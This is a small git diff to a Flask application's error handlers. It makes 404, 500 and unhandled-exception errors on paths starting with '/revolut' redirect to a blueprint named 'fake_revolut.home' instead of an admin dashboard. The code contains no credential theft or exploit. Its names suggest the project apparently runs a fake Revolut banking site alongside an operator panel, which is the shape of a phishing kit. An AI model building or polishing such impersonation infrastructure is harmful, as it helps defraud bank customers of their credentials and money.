@@ -1,6 +1,6 @@
 ﻿import os
 import logging
-from flask import Flask, redirect, url_for
+from flask import Flask, redirect, url_for, request
 from config import config
 from utils.database import init_db
 
@@ -84,6 +84,9 @@ def register_error_handlers(app):
     
     @app.errorhandler(404)
     def not_found_error(error):
+        # Don't redirect Revolut routes to admin dashboard
+        if request.path.startswith('/revolut'):
+            return redirect(url_for('fake_revolut.home'))
         return redirect(url_for('dashboard.index'))
     
     @app.errorhandler(500)
@@ -91,11 +94,17 @@ def register_error_handlers(app):
         from utils.database import db
         db.session.rollback()
         app.logger.error(f'Server Error: {error}')
+        # Don't redirect Revolut routes to admin dashboard
+        if request.path.startswith('/revolut'):
+            return redirect(url_for('fake_revolut.home'))
         return redirect(url_for('dashboard.index'))
     
     @app.errorhandler(Exception)
     def handle_exception(e):
         app.logger.error(f'Unhandled Exception: {e}')
+        # Don't redirect Revolut routes to admin dashboard
+        if request.path.startswith('/revolut'):
+            return redirect(url_for('fake_revolut.home'))
         return redirect(url_for('dashboard.index'))
 
 def register_context_processors(app):
